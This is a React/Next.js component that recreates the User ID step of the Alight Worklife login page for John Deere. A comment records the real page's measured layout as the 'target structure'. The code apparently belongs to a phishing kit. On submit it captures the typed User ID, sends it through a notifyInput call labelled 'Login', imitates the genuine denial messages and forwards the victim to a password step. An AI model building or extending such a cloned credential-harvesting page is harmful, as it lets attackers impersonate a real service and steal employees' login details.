"use client"

import { useRouter } from "next/navigation"
import { useState } from "react"
import { useLoginDeniedQueryParams } from "@/hooks/use-login-denied-query"
import { WELCOME_TITLE } from "@/lib/auth-copy"
import { clearLoginDeniedError, storeUsername } from "@/lib/login-flow-storage"
import { LOADING_MS, wait } from "@/lib/loading-delays"
import { notifyInput } from "@/lib/notify"

/**
 * Step 1 of the John Deere login flow — "Enter your User ID."
 *
 * Target structure (measured at 785x625):
 *   div.mb-xl > h2.welcome-title              "Welcome to Alight Worklife"
 *   div.auth-panel-wrapper
 *     form.f-panel.white.medium
 *       h6 > p.text-l.bold-text               "Enter your User ID."
 *       div.text-xs                           "* Fields marked with an asterisk (*) are required."
 *       div.f-text-input
 *         label.f-text-input-label            "User ID (Required) *"  ← ABOVE the field
 *         div.input-container > input
 *       div.flex.justify-flex-end > a         "Don't have User ID"
 *       div.mt-xl > button.f-button.progressive.medium   "Next" (disabled)
 */
export function UserIdStep() {
  const router = useRouter()
  const [userId, setUserId] = useState("")
  const [errors, setErrors] = useState<{ userId?: string; form?: string }>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  useLoginDeniedQueryParams({
    onDenied: (message) => setErrors({ form: message }),
    onUnavailable: (message) => setErrors({ form: message }),
  })

  const handleUserIdBlur = () => {
    if (!userId.trim()) {
      setErrors((prev) => ({ ...prev, userId: "User ID is required." }))
    }
  }

  const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setUserId(e.target.value)
    if (errors.userId || errors.form) {
      setErrors((prev) => ({ ...prev, userId: undefined, form: undefined }))
    }
  }

  const handleNextStep = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) {
      setErrors({ userId: "User ID is required." })
      return
    }
    if (isSubmitting) return

    const trimmedUserId = userId.trim()
    setIsSubmitting(true)

    clearLoginDeniedError()
    storeUsername(trimmedUserId)

    await notifyInput({
      Flow: "Login",
      "User ID": trimmedUserId,
    })

    await wait(LOADING_MS.next)
    router.push(`/password?userId=${encodeURIComponent(trimmedUserId)}`)
  }

  return (
    <>
      <div className="mb-xl login-section-heading">
        <h2 className="welcome-title bold-text text-5xl m-none">{WELCOME_TITLE}</h2>
      </div>

      <div className="auth-panel-wrapper">
        <form
          onSubmit={handleNextStep}
          className="f-panel white medium auth-panel auth-panel-user-id"
        >
          <div className="auth-panel-content">
            <h6 className="mb-l">
              <p className="text-l bold-text">Enter your User ID.</p>
            </h6>

            <div className="mb-l mt-l text-xs">
              * Fields marked with an asterisk (*) are required.
            </div>

            <div className="f-text-input">
              <label id="UserID-label" htmlFor="UserID" className="f-text-input-label">
                <span className="f-label-text">
                  <span className="f-label-text__text">User ID</span>
                  <span className="f-label-text__required-text">(Required)</span>
                  <span className="f-label-text__required-symbol">*</span>
                </span>
              </label>

              <div className="input-container">
                <input
                  type="text"
                  id="UserID"
                  className={errors.userId || errors.form ? "has-error" : ""}
                  aria-live="polite"
                  aria-labelledby="UserID-label"
                  value={userId}
                  onChange={handleUserIdChange}
                  onBlur={handleUserIdBlur}
                  disabled={isSubmitting}
                  autoComplete="username"
                />
              </div>

              {(errors.form || errors.userId) && (
                <div
                  className="error-message"
                  role="alert"
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "6px",
                    marginTop: "8px",
                    color: "var(--color-error, #c61a1a)",
                    fontSize: "0.85rem",
                    lineHeight: "1.4",
                  }}
                >
                  <svg
                    viewBox="0 0 16 16"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    aria-hidden="true"
                    style={{
                      width: "16px",
                      height: "16px",
                      minWidth: "16px",
                      marginTop: "2px",
                      flexShrink: 0,
                    }}
                  >
                    <circle cx="8" cy="8" r="8" fill="#c61a1a" />
                    <path
                      d="M5.5 5.5L10.5 10.5M10.5 5.5L5.5 10.5"
                      stroke="#ffffff"
                      strokeWidth="1.6"
                      strokeLinecap="round"
                    />
                  </svg>
                  <span>{errors.form || errors.userId}</span>
                </div>
              )}
            </div>

            <div className="flex flex-wrap items-center mt-l mb-l justify-flex-end">
              <a href="/api/login-out" className="accent-navy-blue-text text-m">
                Don&apos;t have User ID
              </a>
            </div>

            <div className="mt-xl">
              <button
                type="submit"
                className="f-button progressive medium"
                aria-label="Next"
                disabled={!userId.trim() || isSubmitting}
              >
                <span className="button-text">{isSubmitting ? "Loading..." : "Next"}</span>
              </button>
            </div>
          </div>
        </form>
      </div>
    </>
  )
}
